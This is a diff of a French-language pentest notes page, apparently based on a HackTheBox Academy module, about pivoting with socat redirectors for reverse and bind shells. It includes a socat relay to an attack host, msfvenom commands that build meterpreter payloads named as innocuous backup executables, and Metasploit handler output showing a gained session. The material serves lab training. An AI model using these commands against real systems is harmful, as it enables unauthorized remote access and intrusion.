@@ -1,6 +1,8 @@
 # Socat Redirection with a Reverse Shell and Bind Shell
 
+{% hint style="info" %}
 Socat est un outil de relais bidirectionnel qui peut créer des sockets entre deux canaux réseau indépendants sans utiliser de tunnel SSH. Il agit comme un redirigeur qui peut écouter sur une adresse et un port, puis transmettre ces données vers une autre adresse IP et un autre port. Nous pouvons démarrer l'écouteur de Metasploit en utilisant la même commande mentionnée dans la dernière section sur notre machine d'attaque, puis exécuter Socat sur le serveur Ubuntu.
+{% endhint %}
 
 #### <mark style="color:green;">Démarrage de l'écouteur Socat</mark>
 
@@ -8,17 +10,13 @@ Socat est un outil de relais bidirectionnel qui peut créer des sockets entre de
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 ```
 
-Socat va écouter en local sur le port 8080 et rediriger tout le trafic vers le port 80 de notre machine d'attaque (10.10.14.18). Une fois notre redirection configurée, nous pouvons créer un payload qui se connectera à notre redirection fonctionnant sur notre serveur Ubuntu. Nous devons également démarrer un écouteur sur notre machine d'attaque, car dès que Socat reçoit une connexion d'une cible, il redirige tout le trafic vers l'écouteur de notre machine d'attaque, où nous obtiendrons un shell.
-
 #### <mark style="color:green;">Création du Payload Windows</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 ```
 {% endcode %}
-
-Gardez à l'esprit que nous devons transférer ce payload sur l'hôte Windows. Nous pouvons utiliser certaines des techniques utilisées dans les sections précédentes pour ce faire.
 
 #### <mark style="color:green;">Démarrage de la Console Metasploit</mark>
 
@@ -47,8 +45,6 @@ msf6 exploit(multi/handler) > run
 [*] Started HTTPS reverse handler on https://0.0.0.0:80
 ```
 
-Nous pouvons tester cela en exécutant notre payload sur l'hôte Windows, et nous devrions voir une connexion réseau en provenance du serveur Ubuntu cette fois-ci.
-
 ```bash
 meterpreter > getuid
 Server username: INLANEFREIGHT\victor
@@ -58,11 +54,11 @@ Server username: INLANEFREIGHT\victor
 
 ## <mark style="color:red;">Socat Redirection with a Bind Shell</mark>
 
-Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.
+{% hint style="warning" %}
+Comme avec le **reverse shell socat**, on peut aussi créer un **bind shell redirector**. Contrairement aux reverse shells qui se connectent du serveur Windows vers le serveur Ubuntu pour être redirigés vers notre hôte d’attaque, le bind shell fait que le serveur Windows ouvre un **listener** sur un port spécifique. On peut générer un payload bind shell pour Windows et l’exécuter sur la cible. Ensuite, on crée un redirector socat sur le serveur Ubuntu pour écouter les connexions entrantes du bind handler Metasploit et les transférer vers le bind shell sur la cible Windows.
+{% endhint %}
 
 ![](https://academy.hackthebox.com/storage/modules/158/55.png)
-
-We can create a bind shell using msfvenom with the below command.
 
 <mark style="color:green;">**Creating the Windows Payload**</mark>
 
@@ -78,8 +74,6 @@ Final size of exe file: 7168 bytes
 Saved as: backupjob.exe
 ```
 {% endcode %}
-
-We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.
 
 <mark style="color:green;">**Starting Socat Bind Shell Listener**</mark>
 
